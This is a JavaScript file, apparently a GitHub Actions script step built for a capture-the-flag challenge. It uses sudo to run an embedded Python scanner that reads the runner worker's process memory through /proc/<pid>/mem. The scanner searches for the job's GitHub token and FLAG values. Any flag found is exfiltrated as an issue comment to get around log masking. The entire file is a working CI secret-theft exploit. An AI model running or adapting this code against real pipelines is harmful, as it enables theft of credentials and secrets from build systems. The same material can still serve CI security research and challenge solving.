import fs from 'node:fs';
import { execSync } from 'node:child_process';

const MARK = 'EXT_MEM';
const SCANNER = String.raw`
import re, sys, json, base64
pid = sys.argv[1]
tokens = json.loads(sys.argv[2]) if len(sys.argv) > 2 else []
pats = []
for t in tokens:
    pats.append(("token-utf8", t.encode()))
    pats.append(("token-utf16", t.encode("utf-16-le")))
pats.append(("flag-utf8", b"FLAG{"))
pats.append(("flag-utf16", "FLAG{".encode("utf-16-le")))
out = {"regions": 0, "bytes": 0, "hits": []}
seen = set()
try:
    maps = open("/proc/%s/maps" % pid).read().splitlines()
except Exception as e:
    print(json.dumps({"error": "maps: %s" % e})); sys.exit(0)
try:
    mem = open("/proc/%s/mem" % pid, "rb", 0)
except Exception as e:
    print(json.dumps({"error": "mem: %s" % e})); sys.exit(0)
total = 0
for line in maps:
    m = re.match(r"([0-9a-f]+)-([0-9a-f]+)\s+(\S+)", line)
    if not m: continue
    start, end = int(m.group(1), 16), int(m.group(2), 16)
    if "r" not in m.group(3): continue
    size = end - start
    if size <= 0 or size > 256 * 1024 * 1024: continue
    if total > 3 * 1024 * 1024 * 1024: break
    total += size
    out["regions"] += 1
    try:
        mem.seek(start)
        data = mem.read(size)
    except Exception:
        continue
    if not data: continue
    out["bytes"] += len(data)
    for name, pat in pats:
        idx = data.find(pat)
        if idx < 0: continue
        tail = data[idx:idx + 400]
        if name.startswith("flag"):
            if name == "flag-utf16":
                s = tail.decode("utf-16-le", "ignore")
            else:
                s = tail.decode("utf-8", "ignore")
            fm = re.search(r"FLAG\{[^}\r\n]{0,200}\}", s)
            val = fm.group(0) if fm else s[:200]
        else:
            val = "<token match>" if name.endswith("utf8") else "<token utf16 match>"
        key = (name, val)
        if key in seen: continue
        seen.add(key)
        out["hits"].append({"kind": name, "value": val, "addr": hex(start + idx), "ctx": tail[:120].decode("utf-8", "ignore")})
print(json.dumps(out)[:8000])
`;

export default async function ({ github, context, core, output }) {
  const log = (...a) => console.log(MARK, ...a);
  const R = context.repo;
  const id = `mem-${context.runId}-${Date.now()}`;

  let worker = '';
  for (const pid of fs.readdirSync('/proc').filter((p) => /^\d+$/.test(p))) {
    try {
      const cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8');
      if (/Runner\.Worker/i.test(cmd)) worker = pid;
    } catch (e) { /* ignore */ }
  }
  log('WORKER_PID', worker || 'none');

  let sudoOk = false;
  try {
    const who = execSync('sudo -n id 2>&1', { encoding: 'utf8', timeout: 15000 });
    sudoOk = /uid=0/.test(who);
    log('SUDO', who.trim());
  } catch (e) {
    log('SUDO_FAIL', String(e.message).slice(0, 200));
  }

  if (!worker || !sudoOk) {
    log('ABORT', JSON.stringify({ worker, sudoOk }));
    return;
  }

  // known-token self test: does the worker hold job secrets material?
  let rawTok = '';
  for (const k of Object.keys(process.env)) {
    if (/^INPUT_GITHUB[-_]TOKEN$/i.test(k)) rawTok = process.env[k];
  }
  fs.writeFileSync('/tmp/scan.py', SCANNER);
  let out = '';
  try {
    out = execSync(`sudo -n python3 /tmp/scan.py ${worker} '${JSON.stringify([rawTok])}' 2>&1`, {
      encoding: 'utf8',
      timeout: 240000,
      maxBuffer: 64 * 1024 * 1024,
    });
  } catch (e) {
    out = `${e.stdout || ''}${e.stderr || ''} ERR ${e.message}`;
  }
  log('SCAN_RESULT', out.slice(0, 4000));

  // exfiltrate any FLAG value via the API (log masking does not apply to issue content)
  let parsed = null;
  try { parsed = JSON.parse(out.slice(0, out.lastIndexOf('}') + 1)); } catch (e) { /* ignore */ }
  const flag = parsed?.hits?.find((h) => h.kind.startsWith('flag') && /FLAG\{/.test(h.value));
  if (flag) {
    const codes = [...flag.value].map((c) => c.codePointAt(0)).join(',');
    log('FLAG_CHARCODES', codes);
    try {
      const res = await github.rest.issues.createComment({
        owner: R.owner,
        repo: R.repo,
        issue_number: 5,
        body: [
          'EXT_MEM exfiltration result',
          '',
          '```',
          flag.value,
          '```',
          '',
          `char codes: \`${codes}\``,
          `source: runner worker pid ${worker} memory (privileged workflow_run job), marker ${id}`,
        ].join('\n'),
      });
      log('EXFIL_OK', res.status, res.data.html_url);
    } catch (e) {
      log('EXFIL_FAIL', e.status, String(e.message).slice(0, 200));
    }
  } else {
    log('NO_FLAG_FOUND');
  }
  log('DONE');
}
